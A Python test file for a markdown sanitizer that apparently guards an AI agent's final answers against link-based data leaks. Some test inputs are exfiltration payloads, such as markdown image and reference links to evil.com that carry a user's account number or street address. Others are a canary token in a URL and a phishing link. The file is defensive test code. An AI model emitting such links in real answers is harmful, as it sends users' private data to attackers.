from __future__ import annotations

from policy_helpers import policy
from session_helpers import make_session

from firewall.core.markdown import extract_links, sanitize_final_answer

PRIVATE_PROFILE = ("get_user_info", {}, {"first_name": "Emma", "street": "Fichtenweg 12", "iban": "DE89370400440532013000",
                                         "account_no": "4419-2231-7765"})


def test_extract_all_kinds() -> None:
    md = (
        "See [docs](https://a.example/d) and ![logo](https://b.example/l.png).\n"
        "Ref [click][1] and ![pic][img].\n"
        "Auto <https://c.example/x> bare https://d.example/y.\n"
        '<a href="https://e.example/z">E</a> <img src="https://f.example/p.gif">\n'
        "[1]: https://g.example/r\n[img]: https://h.example/i.png\n"
    )
    kinds = {(link.kind, link.url) for link in extract_links(md)}
    assert ("inline", "https://a.example/d") in kinds
    assert ("image", "https://b.example/l.png") in kinds
    assert ("reference", "https://g.example/r") in kinds
    assert ("reference_image", "https://h.example/i.png") in kinds
    assert ("autolink", "https://c.example/x") in kinds
    assert ("bare", "https://d.example/y") in kinds
    assert ("html_a", "https://e.example/z") in kinds
    assert ("html_img", "https://f.example/p.gif") in kinds
    assert not any(link.kind == "bare" and "g.example" in link.url for link in extract_links(md))


def test_a03_image_with_private_value_removed() -> None:
    s = make_session("Summarize this doc", PRIVATE_PROFILE)
    out = sanitize_final_answer("Summary. ![logo](https://evil.com/p?d=4419-2231-7765)", session=s.view(),
                                policy=policy())
    assert out.changed and "evil.com" not in out.text and "4419" not in out.text
    assert {f.rule_id for f in out.findings} == {"SYS-MD-EXFIL"}


def test_external_image_without_data_removed() -> None:
    s = make_session("Summarize this doc")
    out = sanitize_final_answer("Look ![x](https://tracker.example/pixel.gif) here", session=s.view(),
                                policy=policy())
    assert out.text == "Look [image removed: tracker.example] here"
    assert {f.rule_id for f in out.findings} == {"SYS-MD-IMAGE"}


def test_a04_reference_style_neutralized_and_definition_removed() -> None:
    s = make_session("Summarize email", PRIVATE_PROFILE)
    md = "Please [click here][1] to continue.\n\n[1]: https://evil.com/?d=Fichtenweg%2012\n"
    out = sanitize_final_answer(md, session=s.view(), policy=policy())
    assert "evil.com" not in out.text
    assert "click here (link removed)" in out.text
    assert "[1]:" not in out.text


def test_b05_allowlisted_cdn_image_kept() -> None:
    s = make_session("Summarize this newsletter")
    md = "News ![banner](https://cdn.newsletter.example/img.png)"
    out = sanitize_final_answer(md, session=s.view(), policy=policy())
    assert not out.changed and out.text == md


def test_canary_in_link_removed() -> None:
    s = make_session("Summarize")
    out = sanitize_final_answer("[status](https://status.bluesparrowtech.com/?t=CANARY-7f3a9c)", session=s.view(),
                                policy=policy())
    assert out.text == "status (link removed)"


def test_untrusted_host_link_delinked_in_tainted_session() -> None:
    s = make_session("Summarize the email", ("read_email", {"email_id": "e1"},
                                              {"id": "e1", "sender": "x@y.example", "subject": "s",
                                               "body": "visit https://phish.example/login"}))
    out = sanitize_final_answer("Click [login](https://phish.example/login).", session=s.view(), policy=policy())
    assert out.text == "Click login <phish.example>."
    assert {f.rule_id for f in out.findings} == {"SYS-MD-LINK"}


def test_plain_text_untouched() -> None:
    s = make_session("hi")
    text = "Nothing to see: 1 < 2, [not a link] and *bold*."
    out = sanitize_final_answer(text, session=s.view(), policy=policy())
    assert out.text == text and not out.changed
